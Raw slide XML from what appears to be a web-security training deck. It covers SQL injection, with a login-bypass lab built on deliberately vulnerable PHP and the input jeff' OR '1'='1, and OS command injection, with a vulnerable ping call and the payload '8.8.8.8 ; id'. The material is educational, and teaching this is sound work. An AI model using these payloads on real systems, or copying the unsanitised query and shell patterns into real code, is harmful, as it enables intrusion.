            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="397" name="Google Shape;397;p22"/>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8" name="Google Shape;398;p22"/>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399" name="Google Shape;399;p22"/>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3" name="Shape 403"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="404" name="Google Shape;404;p23"/>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WHY IT BREAKS</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="405" name="Google Shape;405;p23"/>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Data vs. code</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="406" name="Google Shape;406;p23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2103120"/>
            <a:ext cx="6309360" cy="2331720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 313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23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="896112" y="234086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8" name="Google Shape;408;p23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1133856" y="234086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23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="234086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0" name="Google Shape;410;p23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1737360" y="2176272"/>
            <a:ext cx="5029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developer meant</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="411" name="Google Shape;411;p23"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2633472"/>
            <a:ext cx="6309360" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="12700">
            <a:solidFill>
              <a:srgbClr val="30363D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="sm" w="sm" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="412" name="Google Shape;412;p23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="2761488"/>
            <a:ext cx="5760720" cy="15087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SELECT * FROM users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WHERE user = 'jeff'</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   data:  jeff</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   code:  everything else</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="413" name="Google Shape;413;p23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7223760" y="2286000"/>
            <a:ext cx="4297680" cy="219456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The parser reads ONE finished string. It has no idea which characters came from you.</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500"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a: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Close the quote and your text stops being data - it becomes code.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="414" name="Google Shape;414;p23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4663440"/>
            <a:ext cx="10607040" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 5161"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23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="896112" y="490118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6" name="Google Shape;416;p23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1133856" y="490118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p23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="490118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23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1737360" y="4736592"/>
            <a:ext cx="932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you can make it mean</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="419" name="Google Shape;419;p23"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5193792"/>
            <a:ext cx="10607040" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="12700">
            <a:solidFill>
              <a:srgbClr val="30363D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="sm" w="sm" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="420" name="Google Shape;420;p23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="5321808"/>
            <a:ext cx="10058400" cy="5943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user = jeff' OR '1'='1     -&gt;   WHERE user = 'jeff' OR '1'='1'</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 this is now CODE, not data</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="421" name="Google Shape;421;p2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2" name="Google Shape;422;p2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423" name="Google Shape;423;p2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8" name="Shape 428"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="429" name="Google Shape;429;p2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LAB</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="430" name="Google Shape;430;p24"/>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 02</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="431" name="Google Shape;431;p24"/>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Bypass the login</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="2700" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="432" name="Google Shape;432;p24"/>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p24"/>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434" name="Google Shape;434;p24"/>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 · /lab02</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="435" name="Google Shape;435;p24"/>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p24"/>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437" name="Google Shape;437;p24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="4142232"/>
            <a:ext cx="4480560" cy="8686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Sign in without a valid password by breaking out of the query string. The flag sits behind the login.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1350" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="438" name="Google Shape;438;p24"/>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try the full app's legacy login</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="950" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="439" name="Google Shape;439;p24"/>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0" name="Google Shape;440;p24"/>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1" name="Google Shape;441;p24"/>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4"/>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3" name="Google Shape;443;p24"/>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444" name="Google Shape;444;p24"/>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445" name="Google Shape;445;p24"/>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lab 02: operator login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$sql = "SELECT callsign, flag</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FROM operators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WHERE callsign='$user'</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AND pin='$pin'";</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="446" name="Google Shape;446;p2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7" name="Google Shape;447;p2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448" name="Google Shape;448;p2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23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3" name="Shape 453"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="454" name="Google Shape;454;p31"/>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04</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="30000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="455" name="Google Shape;455;p31"/>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56" name="Google Shape;456;p31"/>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457" name="Google Shape;457;p31"/>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INJECTION · COMMAND &amp; RCE</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="458" name="Google Shape;458;p31"/>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Command injection &amp; RCE</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="459" name="Google Shape;459;p31"/>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Your input becomes part of a shell command. Add your own command. Catch a shell.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="460" name="Google Shape;460;p31"/>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1" name="Google Shape;461;p31"/>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462" name="Google Shape;462;p31"/>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7" name="Shape 467"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="468" name="Google Shape;468;p32"/>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DEFINITION</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="469" name="Google Shape;469;p32"/>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From web input to OS commands</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="470" name="Google Shape;470;p32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2011680"/>
            <a:ext cx="10607040" cy="1325880"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 551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32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1005840" y="2148840"/>
            <a:ext cx="987552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FB950"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1600" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Command injection</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1600" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t> (OS command injection) occurs when an app passes unsafe user input into a system shell - a ping tool, a converter, a backup job. Add a separator and your own command runs with the app's privileges.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="472" name="Google Shape;472;p32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3657600"/>
            <a:ext cx="10607040" cy="2240280"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 3265"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32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="896112" y="389534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32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1133856" y="389534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32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="389534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32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1737360" y="3730752"/>
            <a:ext cx="932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php source - the classic mistake</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="477" name="Google Shape;477;p32"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4187952"/>
            <a:ext cx="10607040" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="12700">
            <a:solidFill>
              <a:srgbClr val="30363D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="sm" w="sm" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="478" name="Google Shape;478;p32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="4315968"/>
            <a:ext cx="10058400" cy="141732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$host = $_GET['host'];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D29922"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1300" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="D29922"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>system("ping -c 1 " . $host);   // you control $host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input: 8.8.8.8 ; id</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runs:  ping -c 1 8.8.8.8 ; id</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="479" name="Google Shape;479;p32"/>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0" name="Google Shape;480;p32"/>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481" name="Google Shape;481;p32"/>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6" name="Shape 486"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="487" name="Google Shape;487;p33"/>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1200"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="F85149"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>REAL-WORLD IMPACT</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="488" name="Google Shape;488;p33"/>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attackers actually do with RCE</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="489" name="Google Shape;489;p33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="21031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90" name="Google Shape;490;p33"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="2260031"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="491" name="Google Shape;491;p33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="20574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Drop a webshell</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="492" name="Google Shape;492;p33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="242316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Persistent remote control of the server, surviving restarts.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="493" name="Google Shape;493;p33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="33375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94" name="Google Shape;494;p33"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="3494471"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="495" name="Google Shape;495;p33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="32918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Ransomware &amp; cryptominers</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="496" name="Google Shape;496;p33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="365760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Encrypt the box for ransom, or quietly mine crypto on your CPUs.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="497" name="Google Shape;497;p33"/>
